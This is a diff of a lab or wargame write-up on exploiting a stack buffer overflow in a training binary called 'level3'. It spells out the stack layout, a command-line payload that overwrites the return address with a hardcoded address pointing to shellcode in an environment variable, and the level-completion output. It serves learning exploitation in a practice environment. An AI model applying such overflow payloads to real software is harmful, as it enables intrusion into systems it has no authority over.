@@ -97,14 +97,14 @@ int main(int argc, char** argv) {
 
 ## 2 - Exploit
 
-For all the steps describe before to work, the layot of the stack of function **foo** is very important. Let's check that in IDA. After a bit of renaming, the variables on stack look like this: 
+For all the steps describe before to work, the layot of the stack of function **foo** is very important. Let's check that in IDA. After a bit of renaming, the variables on the stack look like this: 
 
 ![Logo](/assets/images/bm3-1.png)
 
 Steps:
 * We need a payload of 16 characters in **a**.
 * We need to put 32 bytes in **buf1** from **b** in order to overwrite the return address. 
-* We'll use the same trick with the shellcode placed in an environment variable.
+* We'll use the same trick with the shellcode placed in an environment variable, and overwrite EIP with the address of the variable.
 
 ```bash
 $ ./level3 $(python -c 'print "B"*16') $(python -c 'print "C"*32 + "\xd3\xd8\xff\xff"')
@@ -137,3 +137,5 @@ send an e-mail to unlock@certifiedsecure.com and include:
 You can now start with level4. If you want, you can log in
 as level4 with password  [REDACTED] 
 ```
+
+In the next level we'll exploit more buffer overflows, but this time over the network.
